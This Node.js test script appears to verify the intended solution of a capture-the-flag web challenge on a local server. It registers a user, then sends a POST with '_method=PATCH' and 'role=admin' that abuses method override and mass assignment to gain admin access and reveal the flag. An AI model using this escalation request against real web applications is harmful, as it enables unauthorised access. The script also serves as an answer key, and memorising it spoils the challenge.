const { spawn } = require("child_process");
const http = require("http");
const assert = require("assert");

const PORT = 3917 + Math.floor(Math.random() * 400);
const BASE = `http://127.0.0.1:${PORT}`;
const FLAG = "flag{verify_method_override_mass_assignment}";

function request(method, path, body = "", headers = {}) {
  return new Promise((resolve, reject) => {
    const req = http.request(`${BASE}${path}`, {
      method,
      headers: {
        "Content-Length": Buffer.byteLength(body),
        "Content-Type": "application/x-www-form-urlencoded",
        ...headers
      }
    }, (res) => {
      let data = "";
      res.on("data", (chunk) => {
        data += chunk;
      });
      res.on("end", () => {
        resolve({ status: res.statusCode, headers: res.headers, body: data });
      });
    });
    req.on("error", reject);
    req.end(body);
  });
}

async function waitForServer() {
  for (let i = 0; i < 40; i += 1) {
    try {
      const res = await request("GET", "/");
      if (res.status === 200) return;
    } catch {
      await new Promise((resolve) => setTimeout(resolve, 100));
    }
  }
  throw new Error("server did not start");
}

async function main() {
  const child = spawn(process.execPath, ["server.js"], {
    env: { ...process.env, PORT: String(PORT), FLAG },
    stdio: ["ignore", "pipe", "pipe"]
  });

  try {
    await waitForServer();

    const user = `tester${Date.now()}`;
    const registerBody = `username=${user}&password=pass1234&displayName=Test+User`;
    const registered = await request("POST", "/register", registerBody);
    assert.strictEqual(registered.status, 302, "registration should redirect");
    const cookie = registered.headers["set-cookie"][0].split(";")[0];

    const blocked = await request("GET", "/admin", "", { Cookie: cookie });
    assert.strictEqual(blocked.status, 403, "regular member should not access admin");

    const safeUpdate = await request(
      "POST",
      "/api/profile",
      "displayName=Still+Member&role=admin",
      { Cookie: cookie, Accept: "application/json" }
    );
    assert.strictEqual(safeUpdate.status, 200, "normal profile update should succeed");
    assert.match(safeUpdate.body, /"role": "member"/, "normal update must ignore role");

    const exploit = await request(
      "POST",
      "/api/profile",
      "_method=PATCH&displayName=Director+Now&role=admin",
      { Cookie: cookie, Accept: "application/json" }
    );
    assert.strictEqual(exploit.status, 200, "legacy override should route to PATCH");
    assert.match(exploit.body, /"mode": "legacy-patch"/, "legacy mode should be visible in API response");
    assert.match(exploit.body, /"role": "admin"/, "mass assignment should update role");

    const flagPage = await request("GET", "/admin", "", { Cookie: cookie });
    assert.strictEqual(flagPage.status, 200, "admin page should open after exploit");
    assert.match(flagPage.body, new RegExp(FLAG), "flag should be visible");

    console.log("Verified: method override + mass assignment solve path works.");
  } finally {
    child.kill();
  }
}

main().catch((error) => {
  console.error(error);
  process.exit(1);
});
